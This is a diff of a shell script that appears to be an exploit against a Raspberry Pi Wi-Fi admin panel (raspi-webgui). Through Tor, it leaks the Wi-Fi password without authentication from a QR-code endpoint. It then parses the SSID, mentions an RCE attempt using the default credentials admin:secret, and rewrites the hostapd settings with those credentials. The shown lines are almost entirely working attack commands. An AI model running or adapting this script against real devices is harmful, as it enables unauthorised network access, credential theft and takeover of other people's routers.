@@ -1,6 +1,11 @@
 echo "Gathering Wifi Password without authentication"
 
-torify curl -si  -H "Cookie: PHPSESSID=hey" -H "Referer: lol" $1/app/img/wifi-qr-code.php | grep "X-QR-Code-Content"
+truc=$(torify curl -si  -H "Cookie: PHPSESSID=hey" -H "Referer: lol" $1/app/img/wifi-qr-code.php | grep "X-QR-Code-Content")
+
+echo $truc
+
+name=$(echo $truc | grep -o -P '(?<=WIFI:S:).*(?=;T:)')
+
 
 echo ""
 echo "Trying to RCE with default creds admin:secret"
@@ -42,4 +47,4 @@ echo "Defusing.."
 
 rm Boom.*
 
-torify curl -s -u admin:secret -H "Cookie: PHPSESSID=hey" -X POST $1/index.php?page=hostapd_conf -d "csrf_token=$csrf&interface=wlan0&ssid=raspi-webgui&hw_mode=g&channel=1&wpa=2&wpa_pairwise=CCMP&wpa_passphrase=$pass&beaconintervalEnable=1&beacon_interval=100&max_num_sta=&country_code=FR&SaveHostAPDSettings=Save+settings" >/dev/null
+torify curl -s -u admin:secret -H "Cookie: PHPSESSID=hey" -X POST $1/index.php?page=hostapd_conf -d "csrf_token=$csrf&interface=wlan0&ssid=$name&hw_mode=g&channel=1&wpa=2&wpa_pairwise=CCMP&wpa_passphrase=$pass&beaconintervalEnable=1&beacon_interval=100&max_num_sta=&country_code=FR&SaveHostAPDSettings=Save+settings" >/dev/null
